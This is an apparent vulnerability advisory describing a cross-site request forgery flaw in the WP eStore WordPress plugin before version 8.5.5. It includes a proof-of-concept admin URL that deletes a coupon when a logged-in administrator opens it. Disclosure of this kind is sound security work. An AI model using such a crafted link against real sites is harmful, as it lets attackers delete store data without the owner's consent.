## WordPress Plugin Vulnerabilities

# WP eStore < 8.5.5 - Coupon Deletion via CSRF

### Description

The plugin does not have CSRF checks in some places, which could allow attackers to make logged in users perform unwanted actions via CSRF attacks

### Proof of Concept

Make a logged in admin open a link where `<<RECORD\_ID>>` is any valid coupon ID:
`https://example.com/wp-admin/admin.php?page=wp\_eStore\_discounts&delete\_record=1&record\_id=<<RECORD\_ID>>`
